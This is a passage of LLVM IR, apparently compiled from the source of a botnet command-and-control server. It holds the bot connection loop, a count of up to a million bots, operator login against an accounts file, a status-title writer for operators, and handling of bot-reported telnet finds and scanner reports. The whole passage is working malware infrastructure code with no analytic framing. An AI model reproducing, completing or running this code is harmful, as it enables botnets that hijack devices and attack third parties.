  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0), i64 13, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %183

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %170, i32 1, i32 %171, %struct.epoll_event* %3) #9
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 %176)
  br label %183

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  br label %88

183:                                              ; preds = %175, %162, %102, %101
  br label %292

184:                                              ; preds = %77
  %185 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %186 = load i32, i32* %7, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %185, i64 %187
  %189 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %188, i32 0, i32 1
  %190 = bitcast %union.epoll_data* %189 to i32*
  %191 = load i32, i32* %190, align 1
  store i32 %191, i32* %13, align 4
  %192 = load i32, i32* %13, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %193
  store %struct.clientdata_t* %194, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %195 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %196 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %195, i32 0, i32 1
  store i8 1, i8* %196, align 4
  br label %197

197:                                              ; preds = %184, %288
  %198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %198, i8 0, i64 2048, i1 false)
  br label %199

199:                                              ; preds = %263, %262, %255, %247, %231, %225, %197
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  %201 = icmp ne i8* %200, null
  br i1 %201, label %202, label %208

202:                                              ; preds = %199
  %203 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %204 = load i32, i32* %13, align 4
  %205 = call i32 @fdgets(i8* %203, i32 2048, i32 %204)
  %206 = sext i32 %205 to i64
  store i64 %206, i64* %16, align 8
  %207 = icmp sgt i64 %206, 0
  br label %208

208:                                              ; preds = %202, %199
  %209 = phi i1 [ false, %199 ], [ %207, %202 ]
  br i1 %209, label %210, label %266

210:                                              ; preds = %208
  %211 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0)) #8
  %213 = icmp eq i8* %212, null
  br i1 %213, label %214, label %215

214:                                              ; preds = %210
  store i32 1, i32* %15, align 4
  br label %266

215:                                              ; preds = %210
  %216 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %216)
  %217 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %218 = call i32 @strcmp(i8* %217, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %219 = icmp eq i32 %218, 0
  br i1 %219, label %220, label %226

220:                                              ; preds = %215
  %221 = load i32, i32* %13, align 4
  %222 = call i64 @send(i32 %221, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0), i64 5, i32 16384)
  %223 = icmp eq i64 %222, -1
  br i1 %223, label %224, label %225

224:                                              ; preds = %220
  store i32 1, i32* %15, align 4
  br label %266

225:                                              ; preds = %220
  br label %199, !llvm.loop !13

226:                                              ; preds = %215
  %227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %228 = call i8* @strstr(i8* %227, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)) #8
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = icmp eq i8* %228, %229
  br i1 %230, label %231, label %242

231:                                              ; preds = %226
  %232 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %233 = call i8* @strstr(i8* %232, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.8, i64 0, i64 0)) #8
  %234 = getelementptr inbounds i8, i8* %233, i64 7
  store i8* %234, i8** %18, align 8
  %235 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %236 = load i8*, i8** %18, align 8
  %237 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %235, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0), i8* %236)
  %238 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %239 = call i32 @fflush(%struct._IO_FILE* %238)
  %240 = load volatile i32, i32* @TELFound, align 4
  %241 = add nsw i32 %240, 1
  store volatile i32 %241, i32* @TELFound, align 4
  br label %199, !llvm.loop !13

242:                                              ; preds = %226
  %243 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %244 = call i8* @strstr(i8* %243, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0)) #8
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %246 = icmp eq i8* %244, %245
  br i1 %246, label %247, label %250

247:                                              ; preds = %242
  %248 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %249 = call i8* @strstr(i8* %248, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.10, i64 0, i64 0)) #8
  store i8* %249, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %199, !llvm.loop !13

250:                                              ; preds = %242
  %251 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %252 = call i8* @strstr(i8* %251, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0)) #8
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %254 = icmp eq i8* %252, %253
  br i1 %254, label %255, label %258

255:                                              ; preds = %250
  %256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %257 = call i8* @strstr(i8* %256, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0)) #8
  store i8* %257, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %199, !llvm.loop !13

258:                                              ; preds = %250
  %259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %260 = call i32 @strcmp(i8* %259, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #8
  %261 = icmp eq i32 %260, 0
  br i1 %261, label %262, label %263

262:                                              ; preds = %258
  br label %199, !llvm.loop !13

263:                                              ; preds = %258
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %265 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i64 0, i64 0), i8* %264)
  br label %199, !llvm.loop !13

266:                                              ; preds = %224, %214, %208
  %267 = load i64, i64* %16, align 8
  %268 = icmp eq i64 %267, -1
  br i1 %268, label %269, label %275

269:                                              ; preds = %266
  %270 = call i32* @__errno_location() #10
  %271 = load i32, i32* %270, align 4
  %272 = icmp ne i32 %271, 11
  br i1 %272, label %273, label %274

273:                                              ; preds = %269
  store i32 1, i32* %15, align 4
  br label %274

274:                                              ; preds = %273, %269
  br label %289

275:                                              ; preds = %266
  %276 = load i64, i64* %16, align 8
  %277 = icmp eq i64 %276, 0
  br i1 %277, label %278, label %279

278:                                              ; preds = %275
  store i32 1, i32* %15, align 4
  br label %289

279:                                              ; preds = %275
  br label %280

280:                                              ; preds = %279
  %281 = load i32, i32* %15, align 4
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %283, label %288

283:                                              ; preds = %280
  %284 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %285 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %284, i32 0, i32 1
  store i8 0, i8* %285, align 4
  %286 = load i32, i32* %13, align 4
  %287 = call i32 @close(i32 %286)
  br label %288

288:                                              ; preds = %283, %280
  br label %197

289:                                              ; preds = %278, %274
  br label %290

290:                                              ; preds = %289
  br label %291

291:                                              ; preds = %290
  br label %292

292:                                              ; preds = %291, %183, %58
  %293 = load i32, i32* %7, align 4
  %294 = add nsw i32 %293, 1
  store i32 %294, i32* %7, align 4
  br label %27, !llvm.loop !14

295:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.81, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.81, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %6 = load i8*, i8** %2, align 8
  %7 = ptrtoint i8* %6 to i32
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %1, %26
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %9, i8 0, i64 2048, i1 false)
  %10 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %11 = call i32 @BotsConnected()
  %12 = load i32, i32* %3, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %13
  %15 = getelementptr inbounds %struct.login_info, %struct.login_info* %14, i32 0, i32 0
  %16 = getelementptr inbounds [100 x i8], [100 x i8]* %15, i64 0, i64 0
  %17 = load volatile i32, i32* @OperatorsConnected, align 4
  %18 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.16, i64 0, i64 0), i32 27, i32 %11, i8* %16, i32 %17, i32 7) #9
  %19 = load i32, i32* %4, align 4
  %20 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  %22 = call i64 @strlen(i8* %21) #8
  %23 = call i64 @send(i32 %19, i8* %20, i64 %22, i32 16384)
  %24 = icmp eq i64 %23, -1
  br i1 %24, label %25, label %26

25:                                               ; preds = %8
  ret i8* null

26:                                               ; preds = %8
  %27 = call i32 @sleep(i32 2)
  br label %8
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca [2048 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca %struct._IO_FILE*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca i8*, align 8
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [1000 x i8], align 16
  %22 = alloca [1000 x i8], align 16
  %23 = alloca [1000 x i8], align 16
  %24 = alloca [1000 x i8], align 16
  %25 = alloca [1000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [5000 x i8], align 16
  %29 = alloca [5000 x i8], align 16
  %30 = alloca [5000 x i8], align 16
  %31 = alloca [5000 x i8], align 16
  %32 = alloca [5000 x i8], align 16
  %33 = alloca [5000 x i8], align 16
  %34 = alloca [5000 x i8], align 16
  %35 = alloca [2048 x i8], align 16
  %36 = alloca [2048 x i8], align 16
  %37 = alloca [2048 x i8], align 16
  %38 = alloca [5000 x i8], align 16
  %39 = alloca [800 x i8], align 16
  %40 = alloca [800 x i8], align 16
  %41 = alloca [800 x i8], align 16
  %42 = alloca [800 x i8], align 16
  %43 = alloca [800 x i8], align 16
  %44 = alloca [800 x i8], align 16
  %45 = alloca [800 x i8], align 16
  %46 = alloca [800 x i8], align 16
  %47 = alloca [800 x i8], align 16
  %48 = alloca [800 x i8], align 16
  %49 = alloca [5000 x i8], align 16
  %50 = alloca [2048 x i8], align 16
  %51 = alloca [2048 x i8], align 16
  %52 = alloca [2048 x i8], align 16
  %53 = alloca [5000 x i8], align 16
  %54 = alloca [2048 x i8], align 16
  %55 = alloca [5000 x i8], align 16
  %56 = alloca [2048 x i8], align 16
  %57 = alloca [5000 x i8], align 16
  %58 = alloca [2048 x i8], align 16
  %59 = alloca [5000 x i8], align 16
  %60 = alloca [2048 x i8], align 16
  %61 = alloca [2048 x i8], align 16
  %62 = alloca [2048 x i8], align 16
  %63 = alloca [2048 x i8], align 16
  %64 = alloca [2048 x i8], align 16
  %65 = alloca [2048 x i8], align 16
  %66 = alloca [5000 x i8], align 16
  %67 = alloca %struct._IO_FILE*, align 8
  %68 = alloca i64, align 8
  %69 = alloca %struct.tm*, align 8
  %70 = alloca [50 x i8], align 16
  %71 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %72 = load i8*, i8** %3, align 8
  %73 = ptrtoint i8* %72 to i32
  store i32 %73, i32* %4, align 4
  %74 = load volatile i32, i32* @OperatorsConnected, align 4
  %75 = add nsw i32 %74, 1
  store volatile i32 %75, i32* @OperatorsConnected, align 4
  %76 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %76, i8 0, i64 2048, i1 false)
  %77 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %77, i8 0, i64 2048, i1 false)
  %78 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %78, i8 0, i64 2048, i1 false)
  %79 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %79, i8 0, i64 2048, i1 false)
  store i32 0, i32* %14, align 4
  %80 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.15, i64 0, i64 0))
  store %struct._IO_FILE* %80, %struct._IO_FILE** %13, align 8
  br label %81

81:                                               ; preds = %86, %1
  %82 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %83 = call i32 @feof(%struct._IO_FILE* %82) #9
  %84 = icmp ne i32 %83, 0
  %85 = xor i1 %84, true
  br i1 %85, label %86, label %91

86:                                               ; preds = %81
  %87 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %88 = call i32 @fgetc(%struct._IO_FILE* %87)
  store i32 %88, i32* %15, align 4
  %89 = load i32, i32* %14, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %14, align 4
  br label %81, !llvm.loop !17

91:                                               ; preds = %81
  store i32 0, i32* %16, align 4
  %92 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %92)
  br label %93

93:                                               ; preds = %98, %91
  %94 = load i32, i32* %16, align 4
  %95 = load i32, i32* %14, align 4
  %96 = sub nsw i32 %95, 1
  %97 = icmp ne i32 %94, %96
  br i1 %97, label %98, label %113

98:                                               ; preds = %93
  %99 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %100 = load i32, i32* %16, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %101
  %103 = getelementptr inbounds %struct.login_info, %struct.login_info* %102, i32 0, i32 0
  %104 = getelementptr inbounds [100 x i8], [100 x i8]* %103, i64 0, i64 0
  %105 = load i32, i32* %16, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %106
  %108 = getelementptr inbounds %struct.login_info, %struct.login_info* %107, i32 0, i32 1
  %109 = getelementptr inbounds [100 x i8], [100 x i8]* %108, i64 0, i64 0
  %110 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %99, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.17, i64 0, i64 0), i8* %104, i8* %109)
  %111 = load i32, i32* %16, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %16, align 4
  br label %93, !llvm.loop !18

113:                                              ; preds = %93
  %114 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %114, i8 0, i64 2048, i1 false)
  %115 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %116 = call i32 (i8*, i8*, ...) @sprintf(i8* %115, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0)) #9
  %117 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %118 = call i32 (i8*, i8*, ...) @sprintf(i8* %117, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.19, i64 0, i64 0)) #9
  %119 = load i32, i32* %4, align 4
  %120 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %121 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %122 = call i64 @strlen(i8* %121) #8
  %123 = call i64 @send(i32 %119, i8* %120, i64 %122, i32 16384)
  %124 = icmp eq i64 %123, -1
  br i1 %124, label %125, label %126

125:                                              ; preds = %113
  br label %1075

126:                                              ; preds = %113
  %127 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %128 = load i32, i32* %4, align 4
  %129 = call i32 @fdgets(i8* %127, i32 2048, i32 %128)
  %130 = icmp slt i32 %129, 1
  br i1 %130, label %131, label %132

131:                                              ; preds = %126
  br label %1075

132:                                              ; preds = %126
  %133 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %133)
  %134 = load i32, i32* %5, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %135
  %137 = getelementptr inbounds %struct.login_info, %struct.login_info* %136, i32 0, i32 0
  %138 = getelementptr inbounds [100 x i8], [100 x i8]* %137, i64 0, i64 0
  %139 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %140 = call i32 (i8*, i8*, ...) @sprintf(i8* %138, i8* %139) #9
  %141 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %141, i8** %19, align 8
  %142 = load i8*, i8** %19, align 8
  %143 = call i32 @Find_Login(i8* %142)
  store i32 %143, i32* %5, align 4
  %144 = load i8*, i8** %19, align 8
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %146
  %148 = getelementptr inbounds %struct.login_info, %struct.login_info* %147, i32 0, i32 0
  %149 = getelementptr inbounds [100 x i8], [100 x i8]* %148, i64 0, i64 0
  %150 = call i32 @strcmp(i8* %144, i8* %149) #8
  %151 = icmp eq i32 %150, 0
  br i1 %151, label %152, label %317

152:                                              ; preds = %132
  %153 = load i32, i32* %4, align 4
  %154 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %155 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %156 = call i64 @strlen(i8* %155) #8
  %157 = call i64 @send(i32 %153, i8* %154, i64 %156, i32 16384)
  %158 = icmp eq i64 %157, -1
  br i1 %158, label %159, label %160

159:                                              ; preds = %152
  br label %1075

160:                                              ; preds = %152
  %161 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %162 = load i32, i32* %5, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %163
  %165 = getelementptr inbounds %struct.login_info, %struct.login_info* %164, i32 0, i32 0
  %166 = getelementptr inbounds [100 x i8], [100 x i8]* %165, i64 0, i64 0
  %167 = call i32 (i8*, i8*, ...) @sprintf(i8* %161, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.21, i64 0, i64 0), i8* %166) #9
  %168 = load i32, i32* %4, align 4
  %169 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %170 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %171 = call i64 @strlen(i8* %170) #8
  %172 = call i64 @send(i32 %168, i8* %169, i64 %171, i32 16384)
  %173 = icmp eq i64 %172, -1
  br i1 %173, label %174, label %175

174:                                              ; preds = %160
  br label %1075

175:                                              ; preds = %160
  %176 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %177 = load i32, i32* %4, align 4
  %178 = call i32 @fdgets(i8* %176, i32 2048, i32 %177)
